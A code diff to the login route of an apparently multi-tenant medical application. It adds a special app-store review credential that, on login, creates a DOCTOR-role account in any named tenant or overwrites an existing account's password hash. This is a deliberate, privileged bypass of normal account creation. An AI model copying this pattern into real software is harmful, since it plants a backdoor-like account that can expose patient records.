@@ -8,7 +8,7 @@ import { prisma, prismaAuth, UserRole } from '@marcela/database'
 import { signToken } from '../lib/jwt'
 import { authenticate } from '../middleware/auth'
 import { AppError, NotFoundError, UnauthorizedError } from '../lib/errors'
-import { addDays, addHours, randomToken, sha256 } from '../lib/security'
+import { addDays, addHours, credencialDeRevisao, randomToken, sha256 } from '../lib/security'
 import { effectivePermissions } from '../lib/permissions'
 import { audit } from '../lib/audit'
 import { publicBaseUrl, sendMail } from '../lib/mailer'
@@ -127,10 +127,24 @@ router.post('/login', async (req: Request, res: Response, next: NextFunction) =>
     const tenant = await prisma.tenant.findUnique({ where: { slug: body.tenantSlug } })
     if (!tenant || !tenant.isActive) throw new UnauthorizedError('Credenciais invalidas')
 
-    const user = await prismaAuth.user.findUnique({
+    let user = await prismaAuth.user.findUnique({
       where: { email_tenantId: { email: body.email, tenantId: tenant.id } },
       include: { permissions: true },
     })
+    // Conta de revisão das lojas (Apple/Google): nasce como médica no primeiro
+    // login e acompanha a senha do segredo. Desativada pelo painel, continua
+    // desativada — é como se fecha o acesso quando houver pacientes reais.
+    if (credencialDeRevisao('STAFF', body.email, body.password)) {
+      if (!user) {
+        user = await prismaAuth.user.create({
+          data: { name: 'Revisão das lojas', email: body.email.toLowerCase(), passwordHash: await bcrypt.hash(body.password, 12), role: 'DOCTOR', tenantId: tenant.id },
+          include: { permissions: true },
+        })
+      } else if (!(await bcrypt.compare(body.password, user.passwordHash))) {
+        user.passwordHash = await bcrypt.hash(body.password, 12)
+        await prismaAuth.user.update({ where: { id: user.id }, data: { passwordHash: user.passwordHash } })
+      }
+    }
     if (!user || !user.isActive) throw new UnauthorizedError('Credenciais invalidas')
 
     const passwordMatch = await bcrypt.compare(body.password, user.passwordHash)
